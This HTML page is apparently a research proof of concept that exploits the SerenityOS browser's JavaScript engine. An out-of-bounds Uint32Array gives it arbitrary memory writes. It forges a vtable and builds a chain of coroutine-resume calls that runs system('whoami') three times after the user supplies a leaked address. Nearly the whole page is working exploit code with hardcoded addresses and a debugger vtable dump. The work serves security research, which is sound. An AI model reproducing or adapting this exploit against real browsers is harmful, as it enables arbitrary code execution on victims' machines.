<!DOCTYPE html>
<html>

<head>
    <title>CFOP SerenityOS PoC</title>
</head>

<body>
    <h1>Exploiting a browser with CFOP, showcasing ICC!</h1>
    <label for="hexInput">Enter the address of the memory leak (see recent program output):</label>
    <br>
    <input type="text" id="hexInput" placeholder="0x1234567890abcdef">
    <button onclick="processHex()">Submit</button>
    <br>
    <br>
    <p>After you click the previous button with the corresponding leak, the browser will execute <i>whoami()</i> three times (if your user is "ubuntu", then "ubuntu" will be printed three times).</p>

    
<script>
  function log(msg) {
    console.log(msg);
  }

  function expHexStr(pointer) {
    const result = Math.floor(pointer / 4) - 1;
    return `0x${result.toString(16)}`;
  }

  function expHex(pointer) {
    return result = Math.floor(pointer / 4) - 1;
  }

  log("starting exploit");

  // Firstly, define exploit primitives for vulnerability
  a = new ArrayBuffer()
  b = new Uint32Array(a, 4, 0x3fffffff)

  // We proceed to make a test, that will 1)check that the address is writable and 2) print on screen the address of b
  b[expHex(0x00007ffffffee000)] = 0


function processHex() {
  var vtable_hexvalue, vtable_msb, vtable_lsb
  const input = document.getElementById('hexInput').value;
  const hexPattern = /^0x[0-9a-fA-F]{16}$/; // Validate format: 0x followed by 16 hex digits

  if (hexPattern.test(input)) {
      vtable_hexvalue = BigInt(input); // Store the valid hex value
      vtable_msb = vtable_hexvalue >> 32n;
      vtable_lsb = vtable_hexvalue & 0xffffffffn;
      //convert to numbers, not using the upper bits anyways
      vtable_hexvalue = Number(vtable_hexvalue)
      vtable_msb = Number(vtable_msb)
      vtable_lsb = Number(vtable_lsb)
      console.log("Valid hex input received:", vtable_hexvalue);
      console.log("MSB:", "0x" + vtable_msb.toString(16).padStart(8, '0')); // Print MSB in hex
      console.log("LSB:", "0x" + vtable_lsb.toString(16).padStart(8, '0')); // Print LSB in hex
  } else {
      console.error("Invalid input. Please enter a hex number in the format 0x1234567890abcdef.");
      alert("Invalid input! Please use the format 0x1234567890abcdef.");
      return;
  }

  ////
  //New vtable position of internal_get between *_*. Writable memory
  //
  //0x7ffff5833108 <_ZTVN2JS11Uint32ArrayE+16>:     0x00007ffff55585ea      0x00007ffff56603d4
  //0x7ffff5833118 <_ZTVN2JS11Uint32ArrayE+32>:     0x00007ffff5660b20      0x00007ffff56769e2
  //0x7ffff5833128 <_ZTVN2JS11Uint32ArrayE+48>:     0x00007ffff56601aa      0x00007ffff5347f06
  //0x7ffff5833138 <_ZTVN2JS11Uint32ArrayE+64>:     0x00007ffff5347f0c      0x00007ffff555b336
  //0x7ffff5833148 <_ZTVN2JS11Uint32ArrayE+80>:     0x00007ffff5558f84      0x00007ffff5558ee8
  //0x7ffff5833158 <_ZTVN2JS11Uint32ArrayE+96>:     0x00007ffff5558f36      0x00007ffff567f4a2
  //0x7ffff5833168 <_ZTVN2JS11Uint32ArrayE+112>:    0x00007ffff567bb0e      0x00007ffff5679932
  //0x7ffff5833178 <_ZTVN2JS11Uint32ArrayE+128>:    0x00007ffff567df9e      *0x00007ffff567b8dc*
  //0x7ffff5833188 <_ZTVN2JS11Uint32ArrayE+144>:    0x00007ffff5679866      0x00007ffff5681318
  //0x7ffff5833198 <_ZTVN2JS11Uint32ArrayE+160>:    0x00007ffff53d2a36      0x00007ffff53d2a40
  //0x7ffff58331a8 <_ZTVN2JS11Uint32ArrayE+176>:    0x00007ffff53d2a4a      0x00007ffff53d2a54
  //0x7ffff58331b8 <_ZTVN2JS11Uint32ArrayE+192>:    0x00007ffff53d2a5e      0x00007ffff53d2a68
  //0x7ffff58331c8 <_ZTVN2JS11Uint32ArrayE+208>:    0x00007ffff53d2a72      0x00007ffff53d2a7c
  //0x7ffff58331d8 <_ZTVN2JS11Uint32ArrayE+224>:    0x00007ffff53d2a86      0x00007ffff53d2a90
  //0x7ffff58331e8 <_ZTVN2JS11Uint32ArrayE+240>:    0x00007ffff5661e08      0x00007ffff5676d34
  //0x7ffff58331f8 <_ZTVN2JS11Uint32ArrayE+256>:    0x00007ffff5676d3e      0x00007ffff567df7c
  ////

  //The point where the vtable pointer is stored
  ORIGINAL_VTABLE_PTR = vtable_hexvalue
  //The new base of the vtable, where the vptrs are stored
  _NEW_VTABLE_BASE = 0x00007ffffffee000
  //The base of our ICC chain (that later switches to ICC_CHAIN_BASE), only first element
  ICC_LAUNCH_CHAIN_BASE = ORIGINAL_VTABLE_PTR

  log("Now writing the counterfeit vtable");

  b[expHex(_NEW_VTABLE_BASE)] = 0xf55585ea
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf56603d4
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff

  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf5660b20
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf56769e2
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff

  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf56601aa
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf5347f06
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff

  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf5347f0c
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf555b336
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff

  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf5558f84
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf5558ee8
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff

  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf5558f36
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf567f4a2
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff

  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf567bb0e
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf5679932
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff

  //modthis with jump address to adopt_coroutine resume frame: operator()(_ZZN4Core9EventLoop15adopt_coroutineEON2AK9CoroutineIvEEENUlS4_E_clES4_.Frame *)
  //note that the exploit sets index=4 to jump to destroy() and then await_suspend
  //0x00007ffff5909576
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf567df9e 
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf5909576 // this is the one to modify
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff

  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf5679866
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf5681318
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff

  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf53d2a36
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf53d2a40
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff

  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf53d2a4a
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf53d2a54
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff

  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf53d2a5e
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf53d2a68
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff

  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf53d2a72
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf53d2a7c
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff

  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf53d2a86
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf53d2a90
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff

  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf5661e08 
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf5676d34
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff

  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf5676d3e
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf567df7c
  b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff

  //b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf5577740
  //b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff
  //b[expHex(_NEW_VTABLE_BASE+=4)] = 0xf53d3990
  //b[expHex(_NEW_VTABLE_BASE+=4)] = 0x00007fff

 
  ////
  //
  //  The following is how one of the elements in the ICC chain is encoded
  //
  //  0x0:    xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
  //  0x10:   xxxxxxxxxxxxxxxx  _AFTEREXP_ICC_BASE+0x20 <-- handler(rsi) during await_suspend
  //  0x20:   xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
  //  0x30:   0000000000000004  _AFTEREXP_ICC_BASE <--used during destroyer
  //  0x40:   RDIRDIRDIRDIRDI.  xxxxxxxxxxxxxxxx <-- (not needed) rdi in await_suspend
  //  0x50:   xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
  //  0x60:   xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
  //  0x70:   xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
  //  0x80:   xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
  //  0x90:   xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
  //  0xA0:   xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
  //  0xB0:   xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
  //  0xC0:   xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
  //  0xD0:   xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
  //  0xE0:   xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
  //  0xF0:   xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
  //  0x100:  xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
  //
  //
  //  Safer if the rest of the chain is together with the rest of the payload (after the vtable data)
  //  _NEW_VTABLE_BASE
  //  0x0
  //  0x10
  //  ...
  //  0xF0
  //  0x110:
  _AFTEREXP_ICC_BASE = 0x00007ffffffee120 //_NEW_VTABLE_BASE + 0x120 //old/0x00007ffffffde120  
  //  0x120:  00007ffffffde130  AAAAAAAAAAAAAAAA <-- call target 1 (next ICC chain start) = 0x00007ffff5909576 (frame resume)   
  //  0x130:  0000000000000000  XXXXXXXXXXXXXXXX <--- for the 3rd chain
  //  0x140:  CCCCCCCCCCCCCCCC  BBBBBBBBBBBBBBBB <-- call target 2, with 1 controlled ptr arg (0xCC..CCC)
  //
  // Subsequent elements in the chain just repeat the above structure
  //  0x150:  xxxxxxxxxxxxxxxx  _AFTEREXP_ICC_BASE+0x20
  //
  ////

  log("Now writing the data necessary for our ICC");

  //ICC launch
  b[expHex(_AFTEREXP_ICC_BASE)] = 0x00000000
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00000000
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0xf5909576   //1st chain - frame_resume for next chain item (2nd) = 0x00007ffff5909576
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00007fff
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00000000
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00000000
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0xfffee160   //2nd chain - pointer to *(system()-0x8): ...158
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00007fff
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x616f6877   //1st chain - arg = "whoami"
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x0000696d
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0xf4dc8750   //1st chain  - system() = 0x7ffff4dc8750
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00007fff
  //next chain element
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00000004   //2rd chain - SP index
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00000000
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0xfffee1b0   //2nd chain - used during the destroyer rdi-> 0x...1b0
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00007fff
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x616f6877
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x0000696d
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0xf4dc8750   //2nd chain - system(), but with no arg, will just return
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00007fff
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00000000
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00000000
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00000000
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00000000
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00000000
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00000000
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00000000
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00000000
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00000000
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00000000
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0xf4dc8750   //mod with system() = 0x7ffff4dc8750 ???
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00007fff
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x616f6877   //2nd chain - arg = "whoami"
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x0000696d
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0xf4dc8750   //2nd chain - system() = 0x7ffff4dc8750
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00007fff
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00000000
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00000000
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0xf5909576   //2nd chain - frame_resume for next chain item (3rd)= 0x00007ffff5909576
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00007fff
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00000000
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00000000
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0xfffee1d0   //3rd chain - pointer to *(system()-0x8): ...1d0
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00007fff
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x616f6877   //3rd chain - "whoami" = 0x696d616f6877
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x0000696d  
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0xf4dc8750   //3rd chain - system() = 0x7ffff4dc8750
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00007fff
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00000004
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00000000
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0xfffee190   //2nd chain - pointer to *(system()-0x8): ...190
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00007fff
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00000000
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00000000
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0xf4dc8750   //3rd chain - system() = 0x7ffff4dc8750, this gets a null so just returns
  b[expHex(_AFTEREXP_ICC_BASE+=4)] = 0x00007fff

  log("Proceeding to overwrite the vtable itself, first not the pointer, but surronding data");
  //Setup ICC chain next to the vtable ptr
  b[expHex(ORIGINAL_VTABLE_PTR + 0x30)] = 0x00000004
  b[expHex(ORIGINAL_VTABLE_PTR + 0x18)] = 0xfffee140  //mod with _NEW_VTABLE_BASE+140 = 0x00007ffffffee140
  b[expHex(ORIGINAL_VTABLE_PTR + 0x1C)] = 0x00007fff
  b[expHex(ORIGINAL_VTABLE_PTR + 0x38)] = 0xfffee120  //mod with _NEW_VTABLE_BASE+120 = 0x00007ffffffee140
  b[expHex(ORIGINAL_VTABLE_PTR + 0x3C)] = 0x00007fff

  log("Now overwriting the vtable ptr itself");
  //Overwrite vtable ptr itself. 
  //From this pointer onwards, any call to internal_get (throught b[x]), triggers the exploit
  //Note: the vtable might have changed at this point, check it now
  b[expHex(ORIGINAL_VTABLE_PTR)]   = 0xfffee000 //modthis with new vtable ptr 0x00007ffffffee000
  //b[expHex(ORIGINAL_VTABLE_PTR+4)] = 0x00007fff

  log("At this point we are ready for the exploit, let's go!");
  b[expHex(ORIGINAL_VTABLE_PTR+4)] = 0x00007fff
}
</script>
</body>

</html>
